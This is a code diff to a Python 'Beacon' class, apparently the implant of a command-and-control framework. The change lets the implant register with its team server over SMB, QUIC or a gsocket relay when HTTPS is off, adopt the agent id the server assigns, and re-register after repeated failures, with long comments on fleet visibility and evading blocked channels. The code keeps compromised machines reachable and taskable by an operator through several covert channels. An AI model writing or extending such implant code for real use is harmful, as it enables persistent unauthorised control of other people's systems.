@@ -5641,12 +5641,102 @@ class Beacon:
     def _register_https(self) -> bool:
         info = self._system_info()
         info["action"] = "register"
-        result = self._https_post("register", info)
-        if result is not None and result.get("success"):
-            self._agent_id = result.get("agent_id", self._implant_id)
-            self._registered = True
-            logger.info("Registered as %s", self._agent_id)
-            return True
+        return self._adopt_registration(self._https_post("register", info))
+
+    def _adopt_registration(self, answer: Optional[dict]) -> bool:
+        """Take the identity the server assigned, and say whether we did.
+
+        An answer counts as a registration only when it carries
+        `success`, which is what `_handle_register` replies and what no
+        other action replies: a check-in answer is tasking or `{}`, so
+        this cannot read an empty queue as an identity.
+
+        It exists because `_agent_id` used to be adopted in
+        `_register_https` and nowhere else, while the SMB, QUIC and
+        gsocket rungs of `_beacon_loop` promoted `_registered` on their
+        own. An implant that registered over any leg but HTTPS therefore
+        filed every result afterwards under its *implant* id -- and
+        `_handle_result` keys the agent's `history` by the name the
+        server assigned, so that work never appeared against the agent at
+        all. Registering without adopting the id is half a registration,
+        and the fix belongs in one place rather than in four rungs that
+        would drift.
+        """
+        if not (answer and answer.get("success")):
+            return False
+        self._agent_id = answer.get("agent_id", self._implant_id)
+        self._registered = True
+        logger.info("Registered as %s", self._agent_id)
+        return True
+
+    def _registration_legs(self) -> List[str]:
+        """The upstream legs a registration can be attempted over now.
+
+        Walked in `_RESCUE_UPSTREAM`'s order, which is the chain's order
+        with `dns` removed -- and removed for the reason that constant
+        gives: DNS carries nothing *out*, so a registration sent over it
+        could never be followed by a result. Taking the order from there
+        rather than restating it is what keeps the two from drifting when
+        a sixth leg arrives.
+
+        The gsocket leg is a candidate only when its carrier is already
+        up. That is not an optimisation: the latch is the operator's
+        decision, and a registration that started `gs-netcat` would make
+        every healthy implant hold a connection to the Global Socket
+        Relay Network for the life of the process. `_gsocket_ready`
+        starts nothing -- with no child it answers False at once -- so a
+        gsocket-only implant finds nothing to register over at beacon
+        start, the preamble skips, and the leg registers from inside the
+        loop on the cycle after the latch brought the carrier up, through
+        the `action=register` arm `_beacon_gsocket` already carries.
+        """
+        enabled = {
+            "https": self.https_enabled,
+            "smb": self.smb_enabled,
+            "quic": self.quic_enabled,
+            "gsocket": self.gsocket_enabled and self._gsocket_ready(),
+        }
+        # `.get` and not `[]`: this runs in the beacon's main loop, and a
+        # sixth name in `_RESCUE_UPSTREAM` that nobody added here would
+        # otherwise raise a KeyError on an implant rather than cost that
+        # one leg a registration.
+        return [leg for leg in _RESCUE_UPSTREAM if enabled.get(leg)]
+
+    def _register_upstream(self) -> bool:
+        """Register over the first enabled upstream leg that answers.
+
+        The preamble was gated on `https_enabled`, which was true enough
+        while HTTPS was the only leg carrying an `action=register` of its
+        own. The configuration this exists for is the one where it is
+        off: an implant whose four original legs are all blocked reaches
+        the team server over gsocket alone, and gated on HTTPS it would
+        never register, never appear in the fleet, and look healthy from
+        every other angle.
+
+        Nothing is dropped by trying a check-in method here. Each of the
+        other three sends `action=register` while `_registered` is False,
+        which it is at both call sites -- the preamble has never
+        registered, and the re-registration arm clears it first -- and
+        the reply to a registration is an identity and never tasking.
+
+        The four names below are the only ones `_registration_legs` can
+        return, which is why the last arm is an `else`: a name it did not
+        recognise would otherwise leave `delivered` unbound and raise in
+        the beacon's main loop.
+        """
+        for leg in self._registration_legs():
+            if leg == "https":
+                # The one leg with a registration call of its own: its
+                # check-in does not carry the register action itself.
+                delivered = self._register_https()
+            elif leg == "smb":
+                delivered = self._adopt_registration(self._beacon_smb())
+            elif leg == "quic":
+                delivered = self._adopt_registration(self._beacon_quic())
+            else:
+                delivered = self._adopt_registration(self._beacon_gsocket())
+            if delivered:
+                return True
         return False
 
     def _start_cycle(self):
@@ -9137,10 +9227,31 @@ class Beacon:
             self._implant_id, self.interval, int(self.jitter * 100),
         )
 
-        if self.https_enabled:
+        # The preamble, and not an HTTPS one: it used to be gated on
+        # `https_enabled`, which was true enough while HTTPS was the only
+        # leg that carried a registration of its own. The configuration
+        # this beacon's fifth leg exists for is the one where HTTPS is
+        # off, and gated on it such an implant never registered at all --
+        # it never appeared in the fleet, and looked healthy from every
+        # other angle.
+        #
+        # Gated on there being something to try rather than attempted
+        # regardless: a walk of an empty chain would spend all ten
+        # attempts and ten backoff sleeps before the first cycle, and
+        # then warn about a registration nothing could have attempted. A
+        # gsocket-only implant is exactly that case at beacon start --
+        # its carrier is not up, because the latch and nothing else
+        # starts it -- so it skips this and registers from inside the
+        # loop instead, on the cycle after the latch brought the carrier
+        # up. See `_registration_legs`.
+        #
+        # One attempt is one walk of the chain, so for an HTTPS-only
+        # beacon the ten attempts, the backoff and the warning are
+        # exactly what they always were.
+        if self._registration_legs():
             attempts = 0
             while self._running and not self._registered and attempts < 10:
-                if self._register_https():
+                if self._register_upstream():
                     self._consecutive_failures = 0
                     break
                 attempts += 1
@@ -9180,15 +9291,18 @@ class Beacon:
                 tasking = self._beacon_smb()
                 if tasking is not None:
                     delivered_by = "smb"
-                if tasking and tasking.get("success"):
-                    self._registered = True
+                # Not `_registered = True`: the id the server assigned has
+                # to be adopted too, or every result afterwards is filed
+                # under the implant id and misses the agent's `history`.
+                # See `_adopt_registration`, which all four upstream legs
+                # share.
+                self._adopt_registration(tasking)
 
             if tasking is None and self.quic_enabled:
                 tasking = self._beacon_quic()
                 if tasking is not None:
                     delivered_by = "quic"
-                if tasking and tasking.get("success"):
-                    self._registered = True
+                self._adopt_registration(tasking)
 
             if tasking is None and self.gsocket_enabled:
                 # Last, and it does not start the carrier: that happens
@@ -9200,8 +9314,7 @@ class Beacon:
                 tasking = self._beacon_gsocket()
                 if tasking is not None:
                     delivered_by = "gsocket"
-                if tasking and tasking.get("success"):
-                    self._registered = True
+                self._adopt_registration(tasking)
 
             # Stuck means no *upstream* leg delivered -- not that nothing
             # came back. The team server's DNS tasking route answers with
@@ -9243,7 +9356,16 @@ class Beacon:
                 if self._consecutive_failures > 0 and self._consecutive_failures % 5 == 0:
                     logger.info("Re-registering after %d failures", self._consecutive_failures)
                     self._registered = False
-                    self._register_https()
+                    # The same generalisation as the preamble, and for a
+                    # sharper reason: this called `_register_https`
+                    # whatever the configuration, so a beacon whose only
+                    # leg is gsocket posted to an empty callback URL and
+                    # filed an `https` failure into its own rescue record
+                    # -- a diagnostic about a leg the operator never
+                    # configured, sitting beside the real reason. The
+                    # fifth leg made "no HTTPS leg at all" a shipping
+                    # configuration for the first time.
+                    self._register_upstream()
             else:
                 self._consecutive_failures = 0
                 if delivered_by in _RESCUE_UPSTREAM:
